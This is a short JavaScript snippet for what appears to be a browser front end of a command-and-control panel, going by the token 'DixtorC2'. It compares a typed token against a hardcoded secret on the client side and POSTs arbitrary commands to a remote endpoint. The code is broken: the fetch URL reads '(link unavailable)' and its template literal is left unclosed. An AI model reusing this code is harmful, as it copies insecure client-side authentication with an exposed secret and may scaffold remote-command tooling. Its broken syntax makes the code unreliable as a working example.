const token = "DixtorC2";
const workspaceId = "YOUR_WORKSPACE_ID";

async function validateToken() {
	const accessToken = document.getElementById("access-token").value;
	if (accessToken === token) {
		document.getElementById("command-container").style.display = "block";
	} else {
		alert("Invalid access token!");
	}
}

async function sendCommand() {
	const command = document.getElementById("command").value;
	const response = await fetch(`(link unavailable), {
		method: "POST",
		headers: {
			"Authorization": `Bearer ${token}`,
			"Content-Type": "application/json"
		},
		body: JSON.stringify({
			"command": command
		})
	});

	if (response.ok) {
		alert("Command sent successfully!");
	} else {
		alert("Error sending command:");
		console.error(response);
	}
}
